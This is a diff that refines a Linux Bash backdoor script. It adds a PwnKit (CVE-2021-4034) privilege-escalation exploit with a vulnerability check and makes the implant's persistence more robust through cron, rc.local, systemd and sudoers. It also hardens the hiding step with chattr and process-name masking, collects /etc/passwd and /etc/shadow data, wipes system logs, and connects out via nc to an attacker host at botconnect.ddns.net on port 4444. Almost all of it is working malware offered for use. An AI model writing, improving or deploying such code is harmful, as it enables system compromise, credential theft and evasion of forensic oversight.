@@ -13,25 +13,35 @@ fi
 # Configuration
 ATTACKER_IP="botconnect.ddns.net"  # Replace with your attacker's IP/domain
 PORT=4444  # Port for reverse shell and server
-HIDDEN_DIR="/var/tmp/.webservice"  # Hidden directory
+HIDDEN_DIR="$HOME/.webservice"  # Use user home directory for non-root users
 HIDDEN_FILE="$HIDDEN_DIR/webservice.sh"  # Hidden file
 PROCESS_NAME="[webservice]"  # Process name to mimic
 LOG_FILES=("/var/log/auth.log" "/var/log/syslog" "/var/log/utmp" "/var/log/wtmp" "$HOME/.bash_history")  # Logs to clean
 PERSIST_METHODS=(
     "(crontab -l 2>/dev/null | grep -v $HIDDEN_FILE; echo \"* * * * * /bin/bash $HIDDEN_FILE > /dev/null 2>&1\") | crontab -"
-    "[ -f /etc/rc.local ] && echo '/bin/bash $HIDDEN_FILE' >> /etc/rc.local"
-    "echo '@reboot /bin/bash $HIDDEN_FILE' | crontab -"
-    "mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=/bin/bash $HIDDEN_FILE\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
 )
 SUDOERS_FILE="/etc/sudoers.d/webservice"
 RETRY_INTERVALS=(1 2 4 8 16 32 64)  # Exponential backoff in seconds
 UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "client-$RANDOM-$RANDOM")  # Generate unique client ID
 
-# Function to run PwnKit exploit if not root
-run_pwnkit() {
+# Function to check if system is likely patched against PwnKit (CVE-2021-4034)
+check_pwnkit_vulnerable() {
     PKEXEC_PATH=$(which pkexec)
     if [ -z "$PKEXEC_PATH" ]; then
-        echo "pkexec not found. Falling back to sudo." >&2
+        return 1
+    fi
+    # Check glibc version (PwnKit typically affects glibc < 2.34)
+    GLIBC_VERSION=$(ldd --version | head -n1 | awk '{print $NF}')
+    if [ -n "$GLIBC_VERSION" ] && [ "$(printf '%s\n' "$GLIBC_VERSION" "2.34" | sort -V | head -n1)" != "$GLIBC_VERSION" ]; then
+        return 1
+    fi
+    return 0
+}
+
+# Function to run PwnKit exploit if not root
+run_pwnkit() {
+    if ! check_pwnkit_vulnerable; then
+        echo "System likely patched against PwnKit or pkexec not found. Skipping." >&2
         return 1
     fi
 
@@ -40,12 +50,12 @@ run_pwnkit() {
 
     # Create temporary directory for PwnKit
     TEMP_DIR="/tmp/pwnkit_$(date +%s)"
-    mkdir -p "$TEMP_DIR"
+    mkdir -p "$TEMP_DIR" || return 1
     cd "$TEMP_DIR" || return 1
 
     # Create charset and gconv-modules
     echo "UTF-8" > charset
-    echo "module UTF-8// PWNKIT_MODULE 2" > gconv-modules
+    echo "module UTF-8// PWNKIT_MODULE 1" > gconv-modules
 
     # Create PwnKit module
     cat << 'EOF' > pwnkit_module.c
@@ -65,8 +75,7 @@ EOF
     sed -i "s|PORT|$PORT|" pwnkit_module.c
 
     # Compile the module
-    gcc -fPIC -shared -o pwnkit.so pwnkit_module.c 2>/dev/null
-    if [ $? -ne 0 ]; then
+    if ! gcc -fPIC -shared -o pwnkit.so pwnkit_module.c 2>/dev/null; then
         echo "Failed to compile PwnKit module." >&2
         cd - >/dev/null
         rm -rf "$TEMP_DIR"
@@ -79,11 +88,11 @@ EOF
     chmod 0755 'GCONV_PATH=.'/*.so
 
     # Set environment variables
-    export GCONV_PATH="$TEMP_DIR"
+    export GCONV_PATH="$TEMP_DIR/GCONV_PATH=."
     export CHARSET="$TEMP_DIR/charset"
 
     # Execute pkexec
-    "$PKEXEC_PATH" /bin/true 2>/dev/null
+    pkexec /bin/true 2>/dev/null
 
     # Clean up immediately
     cd - >/dev/null
@@ -93,7 +102,7 @@ EOF
         /bin/bash "$0"
         exit 0
     else
-        echo "PwnKit exploit failed. Falling back to sudo." >&2
+        echo "PwnKit exploit failed." >&2
         return 1
     fi
 }
@@ -101,9 +110,11 @@ EOF
 # Check and elevate to root if possible
 if [ $EUID -ne 0 ]; then
     # Try sudo first
-    sudo -n true 2>/dev/null && exec sudo /bin/bash "$0" "$@"
+    if sudo -n true 2>/dev/null; then
+        exec sudo /bin/bash "$0" "$@"
+    fi
     IS_ADMIN="No"
-    # If sudo fails, try PwnKit
+    # Try PwnKit if not root
     run_pwnkit || {
         echo "Root escalation failed. Running as non-root." >&2
     }
@@ -113,46 +124,62 @@ fi
 
 # Hide the payload
 if [ -d "$HIDDEN_DIR" ]; then
-    chattr -i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
+    chattr -i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null || true
 fi
-mkdir -p "$HIDDEN_DIR"
-cp "$0" "$HIDDEN_FILE"
-chmod 700 "$HIDDEN_DIR" "$HIDDEN_FILE"
-chattr +i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
-echo "$PROCESS_NAME" > /proc/self/comm 2>/dev/null  # Hide process name
+mkdir -p "$HIDDEN_DIR" 2>/dev/null || {
+    echo "Failed to create $HIDDEN_DIR. Falling back to /tmp/.webservice" >&2
+    HIDDEN_DIR="/tmp/.webservice"
+    HIDDEN_FILE="$HIDDEN_DIR/webservice.sh"
+    mkdir -p "$HIDDEN_DIR" 2>/dev/null
+}
+if ! cp "$0" "$HIDDEN_FILE" 2>/dev/null; then
+    echo "Failed to copy script to $HIDDEN_FILE. Continuing without hiding." >&2
+fi
+chmod 700 "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null || true
+chattr +i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null || true
+echo "$PROCESS_NAME" > /proc/self/comm 2>/dev/null || true
 
-# Persistence (multiple methods)
+# Persistence (only crontab for non-root users)
+if [ "$IS_ADMIN" = "Yes" ]; then
+    PERSIST_METHODS+=(
+        "[ -f /etc/rc.local ] && echo '/bin/bash $HIDDEN_FILE' >> /etc/rc.local"
+        "echo '@reboot /bin/bash $HIDDEN_FILE' | crontab -"
+        "mkdir -p /etc/systemd/system; echo '[Unit]\nDescription=Web Service\n[Service]\nExecStart=/bin/bash $HIDDEN_FILE\nRestart=always\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/webservice.service; systemctl enable webservice.service 2>/dev/null"
+    )
+fi
 for method in "${PERSIST_METHODS[@]}"; do
-    eval "$method" &>/dev/null
+    eval "$method" &>/dev/null || true
 done
 
-# Add sudoers entry for root elevation on reboot
-if [ $EUID -eq 0 ]; then
-    echo "$(whoami) ALL=(ALL) NOPASSWD: $HIDDEN_FILE" > "$SUDOERS_FILE"
-    chmod 440 "$SUDOERS_FILE"
-    chattr +i "$SUDOERS_FILE" 2>/dev/null
+# Add sudoers entry for root elevation on reboot (root only)
+if [ "$IS_ADMIN" = "Yes" ]; then
+    echo "$(whoami) ALL=(ALL) NOPASSWD: $HIDDEN_FILE" > "$SUDOERS_FILE" 2>/dev/null
+    chmod 440 "$SUDOERS_FILE" 2>/dev/null || true
+    chattr +i "$SUDOERS_FILE" 2>/dev/null || true
 fi
 
 # Data Exfiltration
-INFO="Hostname: $(hostname)
-OS: $(uname -a)
-IP: $(ip addr show | grep inet | awk '{print $2}' | paste -sd ',')
-Users: $(cat /etc/passwd | cut -d: -f1 | paste -sd ',')
-Uptime: $(uptime)
-Disk Usage: $(df -h | grep -v tmpfs | grep -v udev)"
+INFO="Hostname: $(hostname 2>/dev/null || echo 'Unknown')
+OS: $(uname -a 2>/dev/null || echo 'Unknown')
+IP: $(ip addr show 2>/dev/null | grep inet | awk '{print $2}' | paste -sd ',' || echo 'Unknown')
+Users: $(cut -d: -f1 /etc/passwd 2>/dev/null | paste -sd ',' || echo 'Unknown')
+Uptime: $(uptime 2>/dev/null || echo 'Unknown')
+Disk Usage: $(df -h 2>/dev/null | grep -v tmpfs | grep -v udev || echo 'Unknown')"
 
-# Try root password from /etc/shadow
+# Try root password from /etc/shadow (root only)
 if [ "$IS_ADMIN" = "Yes" ]; then
     ROOT_PASS=$(grep "^root:" /etc/shadow 2>/dev/null || echo "Not readable")
     INFO="$INFO\nRoot Shadow: $ROOT_PASS"
 else
-    INFO="$INFO\nNon-root: Shadow not readable. Other Users: $(grep -v root /etc/passwd | cut -d: -f1,6 | paste -sd ',' 2>/dev/null)"
+    INFO="$INFO\nNon-root: Shadow not readable. Other Users: $(grep -v root /etc/passwd 2>/dev/null | cut -d: -f1,6 | paste -sd ',' || echo 'Unknown')"
 fi
 
-# Clean logs to hide tracks
-for log in "${LOG_FILES[@]}"; do
-    [ -f "$log" ] && echo "" > "$log" 2>/dev/null
-done
+# Clean logs to hide tracks (root only)
+if [ "$IS_ADMIN" = "Yes" ]; then
+    for log in "${LOG_FILES[@]}"; do
+        [ -f "$log" ] && echo "" > "$log" 2>/dev/null || true
+    done
+fi
 
 # Custom command handler
 handle_custom_command() {
@@ -163,7 +190,7 @@ handle_custom_command() {
 Admin: $IS_ADMIN
 PID: $$
 UUID: $UUID
-Uptime: $(uptime)"
+Uptime: $(uptime 2>/dev/null || echo 'Unknown')"
             ;;
         "info")
             echo "$INFO"
@@ -203,12 +230,12 @@ while true; do
             esac
         done
         kill $HEARTBEAT_PID 2>/dev/null
-    ) | nc -w 120 $ATTACKER_IP $PORT 2>/dev/null
+    ) | nc -w 120 "$ATTACKER_IP" "$PORT" 2>/dev/null
     for interval in "${RETRY_INTERVALS[@]}"; do
         sleep "$interval"
-        nc -w 1 $ATTACKER_IP $PORT 2>/dev/null && break
+        nc -w 1 "$ATTACKER_IP" "$PORT" 2>/dev/null && break
     done
 done &
 
 # Clean up the original script
-rm -f "$0" 2>/dev/null
+rm -f "$0" 2>/dev/null || true
